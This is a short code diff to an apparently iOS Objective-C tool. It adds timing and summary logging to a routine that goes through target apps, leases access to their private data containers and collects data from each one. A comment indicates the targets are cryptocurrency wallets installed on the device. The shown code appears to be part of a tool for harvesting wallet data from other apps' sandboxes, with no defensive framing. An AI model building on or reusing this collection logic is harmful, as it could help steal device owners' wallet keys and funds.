@@ -143,6 +143,8 @@ static NSArray<NSDictionary *> *OWTargets(void) {
 
     NSMutableDictionary<NSString *, NSString *> *found = [NSMutableDictionary new];
     NSArray<NSDictionary *> *targets = OWTargets();
+    NSDate *tB = [NSDate date];
+    NSUInteger hitTargets = 0;
     OWLog(@"B: 目标 %lu 个（MHA 定向模式，不做枚举）", (unsigned long)targets.count);
 
     // MHA 路线只支持「一个 identifier 一次查询」，所以直接按 targets 定向。
@@ -168,23 +170,28 @@ static NSArray<NSDictionary *> *OWTargets(void) {
             continue;
         }
         found[bid] = c.path;
+        hitTargets++;
 
+        NSDate *tT = [NSDate date];
         NSString *reason = nil;
         if (![[OWMCMLease shared] activateContainer:c reason:&reason]) {
             OWLog(@"B: %@ lease 失败 (%@)", name, reason ?: @"?");
             continue;
         }
         [self _collectTarget:t containerPath:c.path];
+        OWLog(@"B: %@ 完成（%.2fs）", name, -[tT timeIntervalSinceNow]);
         [[OWMCMLease shared] releasePath:c.path];
     }
 
     [self _writeContainerMap:found];
 
     [[OWMCMLease shared] releaseAll];
+    OWLog(@"B: 汇总 目标=%lu 命中=%lu 产物=%lu 映射=%lu 用时=%.2fs",
+          (unsigned long)targets.count, (unsigned long)hitTargets,
+          (unsigned long)_results.count, (unsigned long)found.count,
+          -[tB timeIntervalSinceNow]);
 
     [[NSNotificationCenter defaultCenter] postNotificationName:OWContainerPassDidFinishNotification object:self];
-    OWLog(@"B: 完成，产出 %lu 项，容器映射 %lu 条",
-          (unsigned long)_results.count, (unsigned long)found.count);
     // YES = 流程跑通；产出为 0 通常是设备上没装目标钱包，由 OWRoute 判定是否写 done
     return YES;
 }
